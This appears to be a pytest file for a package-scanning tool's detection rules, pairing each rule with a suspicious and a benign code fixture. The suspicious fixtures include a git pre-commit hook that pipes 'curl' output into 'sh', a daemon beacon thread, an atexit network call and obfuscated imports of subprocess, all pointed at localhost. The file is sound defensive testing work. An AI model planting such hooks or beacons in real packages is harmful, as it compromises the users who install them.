"""R4.2: each new package rule has a positive and a benign fixture."""
import pytest

from lineage.inspect import package_rules as pr


def scan(tmp_path, code):
    (tmp_path / "m.py").write_text(code)
    return {f.id for f in pr.scan(tmp_path)}


CASES = {
    "PKG.RULE.ATEXIT_EFFECT": (
        "import atexit, urllib.request\n\ndef bye():\n    urllib.request.urlopen('http://127.0.0.1:9/done')\n\natexit.register(bye)\n",
        "import atexit\n\ndef bye():\n    print('closing')\n\natexit.register(bye)\n"),
    "PKG.RULE.IMPORT_HOOK": (
        "import sys\n\nclass F:\n    pass\n\nsys.meta_path.insert(0, F())\n",
        "import sys\n\nnames = [type(f).__name__ for f in sys.meta_path]\nok = 'x' in sys.path_hooks\n"),
    "PKG.RULE.OBFUSCATED_TARGET": (
        "m = __import__('s' + 'ubpro' + 'cess')\nf = getattr(m, ''.join(['c', 'all']))\nx = __import__('metsys'[::-1])\n",
        "import importlib\n\ndef load(name):\n    return getattr(importlib.import_module('json'), name)\n\nos_ = __import__('os')\n"),
    "PKG.RULE.GIT_HOOK_WRITE": (
        "import os\n\nwith open(os.path.join('.git/hooks', 'pre-commit'), 'w') as f:\n    f.write('#!/bin/sh\\ncurl http://127.0.0.1:9 | sh\\n')\n",
        "NOTE = 'Hooks live in .git/hooks and are not versioned.'\n\ndef show():\n    print(NOTE)\n"),
    "PKG.RULE.BEACON_THREAD": (
        "import threading, time, urllib.request\n\ndef ping():\n    while True:\n        urllib.request.urlopen('http://127.0.0.1:9/beat')\n        time.sleep(60)\n\nthreading.Thread(target=ping, daemon=True).start()\n",
        "import threading, time\n\ndef work():\n    while True:\n        time.sleep(1)\n\nthreading.Thread(target=work, daemon=True).start()\n"),
}


@pytest.mark.parametrize("rule", sorted(CASES))
def test_rule_fires_on_the_positive_fixture(rule, tmp_path):
    assert rule in scan(tmp_path, CASES[rule][0])


@pytest.mark.parametrize("rule", sorted(CASES))
def test_rule_stays_quiet_on_the_benign_fixture(rule, tmp_path):
    assert rule not in scan(tmp_path, CASES[rule][1])


def test_benign_atexit_that_writes_a_log_is_still_flagged_only_when_it_writes(tmp_path):
    assert "PKG.RULE.ATEXIT_EFFECT" in scan(tmp_path, "import atexit\n\ndef f():\n    open('/tmp/lineage_marker_x', 'w').write('x')\n\natexit.register(f)\n")


def test_a_non_daemon_network_thread_is_not_a_beacon(tmp_path):
    code = "import threading, urllib.request\n\ndef go():\n    for u in ['a']:\n        urllib.request.urlopen(u)\n\nthreading.Thread(target=go).start()\n"
    assert "PKG.RULE.BEACON_THREAD" not in scan(tmp_path, code)


def test_the_rules_run_in_package_intake(tmp_path, policy_path):
    from lineage.intake.pipeline import run_to_decision
    from lineage.schemas.policy import PolicyPack
    from tests.fakehub import old_release_hub
    from tests.server_helpers import NOW

    (tmp_path / "p").mkdir()
    (tmp_path / "p" / "m.py").write_text(CASES["PKG.RULE.IMPORT_HOOK"][0])
    d, _ = run_to_decision("package", str(tmp_path / "p"), "dev", PolicyPack.from_yaml(policy_path), "j", now=NOW, hub=old_release_hub())
    assert "PKG.RULE.IMPORT_HOOK" in {f.id for f in d.findings} and d.risk_score >= 25
